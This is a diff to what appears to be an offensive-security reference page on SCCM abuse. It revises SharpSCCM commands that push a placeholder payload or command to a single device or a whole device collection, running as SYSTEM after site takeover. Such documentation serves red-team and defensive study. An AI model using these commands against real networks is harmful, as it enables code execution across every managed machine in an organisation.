@@ -16,9 +16,9 @@ This is the payoff of [site takeover](site-takeover.md): SCCM exists to deliver 
 ## Deploying to a collection
 
 ```bash
-# SharpSCCM: deploy an application to a device or a collection, executed by the client agent as SYSTEM
-SharpSCCM.exe exec -d <device> -p "C:\Windows\System32\cmd.exe /c <payload>"
-SharpSCCM.exe exec -c <collection> -r <relay-or-command>
+# SharpSCCM: deploy to a device or a named collection; -s runs as SYSTEM (default is the logged-on user)
+SharpSCCM.exe exec -d <device> -s -p "C:\Windows\System32\cmd.exe /c <payload>"
+SharpSCCM.exe exec -n <collection-name> -s -p "<command>"
 ```
 
 A **device collection** can be a single host or the whole estate, so the same action scales from one target to every managed machine.
